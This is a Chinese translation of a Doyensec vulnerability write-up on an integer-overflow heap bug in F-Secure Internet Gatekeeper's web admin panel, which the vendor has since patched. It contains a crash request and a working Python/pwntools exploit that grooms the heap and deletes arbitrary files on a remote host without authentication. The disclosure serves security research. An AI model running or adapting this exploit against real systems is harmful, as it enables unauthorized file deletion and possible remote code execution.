> 原文链接: https://www.anquanke.com//post/id/198033 


# F-Secure Internet Gatekeeper堆缓冲区溢出漏洞分析


                                阅读量   
                                **871026**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者doyensec，文章来源：blog.doyensec.com
                                <br>原文地址：[https://blog.doyensec.com/2020/02/03/heap-exploit.html](https://blog.doyensec.com/2020/02/03/heap-exploit.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t019ea6486bfd0b9895.jpg)](https://p2.ssl.qhimg.com/t019ea6486bfd0b9895.jpg)



## 0x00 前言

本文介绍了我们在F-Secure Internet Gatekeeper应用中发现的一个漏洞，攻击者可利用该漏洞实现未认证远程代码执行效果。



## 0x01 环境搭建

我使用的是[CentOS](http://isoredirect.centos.org/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-1908.iso)虚拟机，1个处理器核心，4GB内存。我们需要从[官网](https://www.f-secure.com/en/business/downloads/internet-gatekeeper)下载并安装[F-Secure Internet Gatekeeper](https://help.f-secure.com/product.html?business/igk/5.40/en/concept_16E400B3FDE344EDB1F699EE9C4117DB-5.40-en)。根据我们了解，目前厂商已经下架了存在漏洞的版本。

受影响的原始安装包SHA256哈希值为：`1582aa7782f78fcf01fccfe0b59f0a26b4a972020f9da860c19c1076a79c8e26`。

安装过程如下：

1、如果使用的是x64版的CentOS，执行`yum install glibc.i686`；

2、使用`rpm -I &lt;fsigkbin&gt;.rpm`安装Internet Gatekeeper；

3、为了更方便调试，可以安装gdb 8+及[GEF](https://github.com/hugsy/gef)。

现在可以使用GHIDRA/IDA或者拿手的反汇编器/反编译器开始逆向分析Internet Gatekeeper。



## 0x02 漏洞分析

根据F-Secure描述，Internet Gatekeeper是“在网关级别针对企业网络的高效且易管理的防护解决方案”。

F-Secure Internet Gatekeeper包含一个控制面板，运行在`9012/tcp`端口上。该面板可以用来控制产品中可用的所有服务及规则（HTTP代理、IMAP代理等）。控制面板通过HTTP协议访问，由`fsikgwebui`程序实现，该程序采用C语言编写。实际上整个web服务端都采用C/C++开发，其中部分引用到了`civetweb`，这表明服务端可能使用的是自定义版的[CivetWeb](https://github.com/civetweb/civetweb)。

既然服务端采用C/C++开发，我们就可以尝试寻找内存破坏漏洞，这是这种语言中经常出现的问题。

我们选择使用[Fuzzotron](https://github.com/denandz/fuzzotron)来fuzz管理面板，这是使用[Radamsa](https://gitlab.com/akihe/radamsa)作为底层引擎的fuzzer，很快我们就找到了这类漏洞。`fuzzotron`内置TCP支持，便于fuzz网络服务。在测试种子方面，我们提取了一个有效的POST请求，该请求用来更改管理面板的语言设置。未授权用户可以发起该请求，因此非常适用于作为fuzz种子。

在分析`radamsa`的输入样例时，我们可以看到该漏洞的根源与`Content-Length`头部字段有关。导致软件崩溃的测试用例头部特征为：`Content-Length: 21487483844`，这表明溢出漏洞与不正确的整数计算有关。

在`gdb`中调试测试用例后，我们发现导致崩溃的代码位于`fs_httpd_civetweb_callback_begin_request`函数中，该方法负责处理入栈连接，根据HTTP操作类型、路径或者所使用的cookie来将请求分发至相关的函数进行处理。

为了演示漏洞，我们向管理面板所在的`9012`端口发送POST请求，其中设置了巨大的一个`Content-Length`头部值：

```
POST /submit HTTP/1.1
Host: 192.168.0.24:9012
Content-Length: 21487483844

AAAAAAAAAAAAAAAAAAAAAAAAAAA

```

目标应用会解析该请求，执行`fs_httpd_get_header`函数来获取`Content-Length`值。随后，该字段值会被传递给`strtoul`（字符串转换为无符号长整型）函数进行处理。

相关控制流对应的伪代码如下所示：

```
content_len = fs_httpd_get_header(header_struct, "Content-Length");
if ( content_len )`{`
   content_len_new = strtoul(content_len_old, 0, 10);
`}`
```

为了理解`strtoul`函数的处理逻辑，我们可以查看对应的`man`页面。`strtoul`的返回值类型为无符号长整型，最大值为`2^32-1`（32位系统上）。

> `strtoul()`函数会返回转换结果，如果输入值带有减号前缀，则返回转换结果的取反值作为无符号值。如果（非负）原始值溢出，`strtoul()`会返回`ULONG_MAX`，并将`errno`设置为`ERANGE`。整个处理逻辑与`strtoull()`相同（后者对应的是`ULLONG_MAX`）。

由于我们提供的`Content-Length`对无符号长整型来说过长，因此`strtoul`会返回`ULONG_MAX`值，32位系统上对应的是`0xFFFFFFFF`。

接着看一下漏洞逻辑。当`fs_httpd_civetweb_callback_begin_request`函数尝试执行`malloc`请求，为我们的数据分配空间时，首先会在`content_length`变量上加`1`，然后调用`malloc`。

相应的伪代码如下所示：

```
// fs_malloc == malloc
data_by_post_on_heap = fs_malloc(content_len_new + 1)
```

由于`0xFFFFFFFF + 1`会出现整数溢出，因此得到的结果值为`0x00000000`，最终`malloc`会分配大小为`0`字节的内存空间。

`malloc`的确允许我们使用`0`字节参数来调用，当调用`malloc(0)`时，函数会返回指向堆的一个有效指针，该指针指向大小最小的一个chunk（大小为`0x10`字节）。我们也可以在`man`页面中了解这一行为：

> `malloc()`函数会分配`size`字节大小的空间，返回指向已分配内存的一个指针，该内存区域未经初始化。如果`size`等于`0`，那么`malloc()`就会返回`NULL`或者一个有效的指针值，以便后续`free()`执行释放操作。

如果进一步分析Internet Gatekeeper的代码，可以看到其中调用了`mg_read`。

```
// content_len_new is without the addition of 0x1.
// so content_len_new == 0xFFFFFFFF
if(content_len_new)`{`
    int bytes_read = mg_read(header_struct, data_by_post_on_heap, content_len_new)
`}`
```

在溢出过程中，该代码会读取堆上任意数量的数据，没有任何约束条件。对于漏洞利用而言，这是非常优秀的一个利用原语，我们可以停止向HTTP流写入数据，目标软件会简单关闭连接并继续执行。在这种情况下，我们可以完全控制希望写入的字节数。

总而言之，我们可以利用`malloc`返回的`0x10`大小chunk，通过任意数据溢出来覆盖已有的内存结构。这里我们可以参考如下PoC代码，这段代码比较粗糙，利用了堆上已有的一个结构，修改标志值（`should_delete_file = true`），然后将我们想要删除的文件完整路径喷射到堆上。Internet Gatekeeper内部处理程序中包含一个`decontruct_http`方法，该方法会寻找该标志，执行文件删除操作。利用这一点，攻击者可以删除任意文件，这足以说明漏洞的严重程度。

```
from pwn import *
import time
import sys

def send_payload(payload, content_len=21487483844, nofun=False):
    r = remote(sys.argv[1], 9012)
    r.send("POST / HTTP/1.1\n")
    r.send("Host: 192.168.0.122:9012\n")
    r.send("Content-Length: `{``}`\n".format(content_len))
    r.send("\n")
    r.send(payload)
    if not nofun:
        r.send("\n\n")
    return r

def trigger_exploit():
    print "Triggering exploit"
    payload = ""
    payload += "A" * 12             # Padding
    payload += p32(0x1d)            # Fast bin chunk overwrite
    payload += "A"* 488             # Padding
    payload += p32(0xdda00771)      # Address of payload
    payload += p32(0xdda00771+4)    # Junk
    r = send_payload(payload)

def massage_heap(filename):
        print "Trying to massage the heap....."
        for x in xrange(100):
            payload = ""
            payload += p32(0x0)             # Needed to bypass checks
            payload += p32(0x0)             # Needed to bypass checks
            payload += p32(0xdda0077d)      # Points to where the filename will be in memory
            payload += filename + "\x00"
            payload += "C"*(0x300-len(payload))
            r = send_payload(payload, content_len=0x80000, nofun=True)
            r.close()
            cut_conn = True
        print "Heap massage done"

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "Usage: ./`{``}` &lt;victim_ip&gt; &lt;file_to_remove&gt;".format(sys.argv[0])
        print "Run `export PWNLIB_SILENT=1` for disabling verbose connections"
        exit()
    massage_heap(sys.argv[2])
    time.sleep(1)
    trigger_exploit()
    print "Exploit finished. `{``}` is now removed and remote process should be crashed".format(sys.argv[2])
```

目前漏洞利用的成功率为67~70%，并且我们的PoC依赖于前面所搭建的测试环境。

由于我们可以精准控制chunk大小，在小chunk上覆盖尽可能多数据，因此该漏洞肯定能达到RCE效果。此外，目标应用使用了多个线程，因此我们可以利用该特点进入干净的堆区域，多次尝试漏洞利用。如果大家想进一步跟我们合作，可以将RCE PoC发送至我们的&lt;a href=”[info@doyensec.com](mailto:info@doyensec.com)“&gt;邮箱。

F-Secure为该问题分配的编号为[FSC-2019-3](https://www.f-secure.com/en/business/support-and-downloads/security-advisories/fsc-2019-3)，在5.40 – 5.50 hotfix 8版的Internet Gatekeeper（2019年7月11日发布）中修复了该漏洞。



## 0x03 参考资料

#### <a class="reference-link" name="Linux%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0"></a>Linux堆溢出利用系列文章
- [Linux Heap Exploitation Intro Series: Set you free() – part 1](https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/)
- [Linux Heap Exploitation Intro Series: Set you free() – part 2](https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-2/)
#### <a class="reference-link" name="GLibC%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"></a>GLibC背景知识
- [GLibC Malloc for Exploiters – YouTube](https://www.youtube.com/watch?v=z33CYcMf2ug)
- [Understanding the GLibC Implementation – Part 1](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
- [Understanding the GLibC Implementation – Part 2](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
#### <a class="reference-link" name="%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"></a>相关工具
<li>
[GEF](https://github.com/hugsy/gef) – 辅助漏洞利用的GDB扩展，也能在堆漏洞利用调试中提供非常有用的一些命令。</li>
<li>
[Villoc](https://github.com/wapiflapi/villoc) – 通过HTML可视化表示堆布局。</li>